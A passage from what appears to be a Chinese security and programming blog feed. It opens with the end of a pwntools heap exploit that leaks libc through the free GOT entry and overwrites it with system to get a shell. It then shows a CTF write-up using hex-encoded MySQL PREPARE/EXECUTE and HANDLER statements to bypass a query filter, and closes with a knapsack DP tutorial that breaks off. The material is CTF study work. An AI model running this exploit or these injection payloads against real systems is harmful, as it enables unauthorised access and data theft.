io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span>  p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content : "</span><span class="token punctuation">)</span>data <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Done !"</span><span class="token punctuation">)</span>free_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> free_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span> <span class="token keyword">print</span> <span class="token string">"libc:"</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>system <span class="token operator">=</span> libc <span class="token operator">+</span> <span class="token number">0x45390</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL注入</title>
      <link href="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/"/>
      <url>/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/</url>
      
        <content type="html"><![CDATA[<p>复习了一下SQL注入，发觉还很有一部分知识点没掌握，记录一下<br>以2019强网杯随便注为例，之前是用的更改列名和表名来做的，但相对于利用MySQL预处理语句来做要麻烦很多，先了解一下MySQL的预处理语句</p><pre class=" language-sql"><code class="language-sql">语法：定义预处理语句PREPARE stmt_name <span class="token keyword">FROM</span> preparable_stmt<span class="token punctuation">;</span>执行预处理语句<span class="token keyword">EXECUTE</span> stmt_name <span class="token punctuation">[</span><span class="token keyword">USING</span> <span class="token variable">@var_name</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token variable">@var_name</span><span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">;</span>删除<span class="token punctuation">(</span>释放<span class="token punctuation">)</span>定义{<span class="token keyword">DEALLOCATE</span> <span class="token operator">|</span> <span class="token keyword">DROP</span>} PREPARE stmt_name<span class="token punctuation">;</span><span class="token keyword">set</span>语句可用于向系统变量或用户变量赋值，针对用户变量的定义如下：<span class="token keyword">SET</span> <span class="token variable">@var_name</span> <span class="token operator">=</span> expr <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token variable">@var_name</span> <span class="token operator">=</span> expr<span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>简单来说，预定义语句就类似于C的define关键字<br>再来看题<br>我们已经知道了flag在1919810931114514表中<br><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/1.jpg" alt=""><br>不在我们当前表中，需要跨表查询，但能够查询的语句都被过滤掉了<br>这时我们可以利用预定义语句，如下</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">Set</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#0x73656c656374202a2066726f6d20603139313938313039333131313435313460是select * from `1919810931114514`的16进制编码</span>Prepare x <span class="token keyword">from</span> <span class="token variable">@a</span><span class="token keyword">Execute</span> x</code></pre><p>第一句相当于把变量@a赋值为0x73656c656374202a2066726f6d20603139313938313039333131313435313460<br>第二句将@a预编译为x<br>第三句执行x<br><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/2.jpg" alt=""><br>可以获得flag</p><p>再来看另一种方法</p><pre class=" language-bash"><code class="language-bash">handler语句代替select查询mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中</code></pre><pre class=" language-sql"><code class="language-sql">语法结构<span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">OPEN</span> <span class="token punctuation">[</span> <span class="token punctuation">[</span><span class="token keyword">AS</span><span class="token punctuation">]</span> alias<span class="token punctuation">]</span><span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">READ</span> index_name { <span class="token operator">=</span> <span class="token operator">|</span> <span class="token operator">&lt;=</span> <span class="token operator">|</span> <span class="token operator">>=</span> <span class="token operator">|</span> <span class="token operator">&lt;</span> <span class="token operator">|</span> <span class="token operator">></span> } <span class="token punctuation">(</span>value1<span class="token punctuation">,</span>value2<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>    <span class="token punctuation">[</span> <span class="token keyword">WHERE</span> where_condition <span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">]</span><span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">READ</span> index_name { <span class="token keyword">FIRST</span> <span class="token operator">|</span> <span class="token keyword">NEXT</span> <span class="token operator">|</span> <span class="token keyword">PREV</span> <span class="token operator">|</span> <span class="token keyword">LAST</span> }    <span class="token punctuation">[</span> <span class="token keyword">WHERE</span> where_condition <span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">]</span><span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">READ</span> { <span class="token keyword">FIRST</span> <span class="token operator">|</span> <span class="token keyword">NEXT</span> }    <span class="token punctuation">[</span> <span class="token keyword">WHERE</span> where_condition <span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">]</span><span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">CLOSE</span></code></pre><p>我用本地的sqli-lab的secruity库的users表来测试<br><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/3.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/4.jpg" alt=""><br>能够一行一行地读取表中的内容<br>再回到题目<br>我们的sql语句如下</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">handler</span> \<span class="token punctuation">`</span><span class="token number">1919810931114514</span>\<span class="token punctuation">`</span> <span class="token keyword">open</span> <span class="token keyword">as</span> <span class="token number">a</span> <span class="token keyword">handler</span> <span class="token number">a</span> <span class="token keyword">read</span> <span class="token keyword">next</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/5.jpg" alt=""><br>同样能够读取flag</p><p>预编译语句说完了，再看到无列名注入</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL预处理 </tag>
            
            <tag> 无列名注入 </tag>
            
            <tag> order by盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态规划的背包问题</title>
      <link href="/LawlietLW.github.io/2020/02/10/dong-tai-gui-hua/"/>
      <url>/LawlietLW.github.io/2020/02/10/dong-tai-gui-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="01背包和完全背包"><a href="#01背包和完全背包" class="headerlink" title="01背包和完全背包"></a>01背包和完全背包</h1><p>记录一下这两天学习的动态规划算法，拖了好久了<br>动态规划可以说是递归的升级版，甚至可以替代BFS和DFS，能熟练掌握的话就不用再就纠结用什么搜索算法好了<br>这两天在洛谷上刷了一下动态规划地背包算法部分，深感DP的便利，用贪心算法的话要写一大篇代码<br>进入正题<br>背包算法可分为01背包，完全背包和多重背包，在这里主要记录前两种，先贴出两种背包算法的核心代码<br>完全背包代码段：</p><pre class=" language-c"><code class="language-c">    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>V<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>f<span class="token punctuation">[</span>j<span class="token operator">-</span>w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这是01背包的核心代码段：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>m<span class="token punctuation">;</span>j<span class="token operator">>=</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>f<span class="token punctuation">[</span>j<span class="token operator">-</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>可以看出，完全背包和01背包的差别仅仅在于第二次遍历的方向，前者是正向遍历，而后者是逆向遍历</p><h1 id="01背包"><a href="#01背包" class="headerlink" title="01背包"></a>01背包</h1><p>先讲解01背包</p><pre class=" language-bash"><code class="language-bash">问题描述:01背包是在N件物品取出若干件放在空间为C的背包里，每件物品的体积为W1，W2至Wn，与之相对应的价值为V1,V2至Vn。01背包是背包问题中最简单的问题。01背包的约束条件是给定几种物品，每种物品有且只有一个，并且有权值和体积两个属性</code></pre><h2 id="DP三步解题思路"><a href="#DP三步解题思路" class="headerlink" title="DP三步解题思路"></a>DP三步解题思路</h2><p>解题思路:<br>一般而言，DP题都有三个步骤:</p><pre class=" language-bash"><code class="language-bash">1.确定dp数组的含义，即dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span>所代表的意义2.确定dp递推表达式，即dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span>由什么可以推导而来3.确定dp数组初值，和递归一样，dp同样也需要初值，否则就会陷入死循环</code></pre><p>再来看01背包问题<br>每种物品只有一个，对于任何一个物品，我们的选择只有两种:装入背包或者不装如背包</p><h2 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h2><p>这里我们以洛谷动态规划的背包部分第一题为例</p><pre><code>P1060 开心的金明金明今天很开心，家里购置的新房就要领钥匙了，新房里有一间他自己专用的很宽敞的房间。更让他高兴的是，妈妈昨天对他说：“你的房间需要购买哪些物品，怎么布置，你说了算，只要不超过NN元钱就行”。今天一早金明就开始做预算，但是他想买的东西太多了，肯定会超过妈妈限定的NN元。于是，他把每件物品规定了一个重要度，分为55等：用整数1-51−5表示，第55等最重要。他还从因特网上查到了每件物品的价格（都是整数元）。他希望在不超过NN元（可以等于NN元）的前提下，使每件物品的价格与重要度的乘积的总和最大。设第j件物品的价格为v[j],重要度为w[j]共选中了k件物品编号依次为j1,j2,…,jk,则所求的总和为：v[j1]*w[j1]+v[j2]*w[j2]+...+v[jk]*w[jk]请你帮助金明设计一个满足要求的购物单。</code></pre><p>典型的01背包题<br><code>在有限的背包容量下，怎样装入物品能使装入的物品的权重最大</code><br>首先确定我们的dp数组表达式，dp[i]代表着什么<br>根据题意，我们要求的是如何使在不超过背包容量的情况下使装入背包物品的权重最大<br>那我们就顺着题意假设:dp[i]为当背包容量为i时，不装入第j件物品时的最大权重<br>在这道题里就是:dp[i]为当我们的钱为i时，不买第j件物品时的最大权重</p><p>第二步，确定递推表达式dp[i]可以从什么推导而来<br>我们想，第j件物品可以装入可以不装入，而可以选择装入或者不装入的前提是，我们背包的剩余容量要大于等于这件物品所占的体积,在这道题里就是我们剩余的钱要大于等于第j个物品的价格，即i&gt;=v[j]<br>那么，当不装入这件物品时，dp[i]不变(不要忘了我们对数组的定义),当装入时，<code>dp[i]=dp[i-v[i]]+v[j]*w[i]</code>,因为我们装入了第j件物品，相应的我们剩下的钱就是当前的钱i-v[j],我们的权重就相应的增加v[j]*w[j]<br>这样一来，我们要求的dp[i]就是在买和不买两者间选择较大的那一方<br>递推公式就为</p><pre class=" language-c"><code class="language-c">dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span>v<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span>v<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">*</span>w<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>第三步，求初值<br>事实上，这种背包问题并不需要我们特意求初值，因为我们递推公式的成立是有条件的，相当于已经设定了一个初始值。</p><p>三部分都已经确定好了，接下来就是用代码表达出来了</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"stdio.h"</span></span><span class="token keyword">int</span> v<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">,</span>p<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">,</span>w<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">50000</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">max</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> x<span class="token operator">></span>y<span class="token operator">?</span>x<span class="token punctuation">:</span>y<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>m<span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d %d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">,</span><span class="token operator">&amp;</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d %d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">*</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>n<span class="token punctuation">;</span>j<span class="token operator">>=</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>j<span class="token operator">-</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span>w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>代码很简单，核心代码只有短短几行而已，换做是用贪心来求的话可就麻烦多了</p><h2 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h2><p>再来一题<br><img src="/LawlietLW.github.io/2020/02/10/dong-tai-gui-hua/1.jpg" alt=""><br>还是先确定dp数组的含义<br>我们要求的是，把钱花光有多少种方法，依然是每种菜只能上一次,没有跳出01背包的范围<br>这次我们用二维数组，dp[i][j]，dp[i][j]表示:前i种菜且未上第i盘菜时，余额为j的情况下的点菜方法数<br>可能有点绕，不过往下看就懂了</p><p>再求递推公式<br>首先，和上一题一样，我们能对第i种菜作出上或者不上选择的前提是我们的余额大于等于第i种菜的价格，即<code>j&gt;= a[i]</code>.当<code>j&lt;a[i]</code>时，dp[i][j]就等于前一种状态的数值，即<code>dp[i][j]=dp[i-1][j]</code><br>再来看<code>j&gt;= a[i]</code>的情况，&gt;=的情况可以分开来谈，我们先看=的情况<br>在此之前我们再次明确一下dp数组的定义，<code>dp[i][j]表示:前i种菜且未上第i盘菜时，余额为j的情况下的点菜方法数</code>，注意，是方法数<br>当我们的余额j等于第i种菜的价格a[i]时，相对于上一个状态我们就多了一种方法，就是要第i种菜，要了第i种菜后我们的余额就变成了0，就买不了其他的菜了，所以在<code>j=a[i]</code>这种情况下，递推公式就是<code>dp[i][j]=d[i-1][j]+1</code><br>再看j&gt;a[i]的情况，这种情况下我们的余额在买完第i种菜后还有剩余，可能可以继续买剩下的菜，所以我们的方法数就演变成了不买这盘菜和买这盘菜的方法总和，递推公式为<code>dp[i][j]=dp[i-1][j]+dp[i-1][j-a[i]]</code><br>这样一来我们的dp递推公式就求完了</p><p>第三步，求初值<br>和上一题一样，同样不需要求初值，i和j的取值都是有范围的</p><p>代码如下</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"stdio.h"</span></span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">200</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">200</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">10001</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>m<span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d %d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">,</span><span class="token operator">&amp;</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>m<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">==</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">></span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">&lt;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><p>01背包就先记录这两题，有时间再补充</p><h1 id="完全背包"><a href="#完全背包" class="headerlink" title="完全背包"></a>完全背包</h1><p>再来看完全背包问题<br>完全背包和01背包的基本是一样的，区别在于完全背包的物品可以重复装入，也就是每个物品有无限个，依然求怎么装物品能使权重最大</p><h2 id="例题1-1"><a href="#例题1-1" class="headerlink" title="例题1"></a>例题1</h2><p>上题<br><img src="/LawlietLW.github.io/2020/02/10/dong-tai-gui-hua/1.jpg" 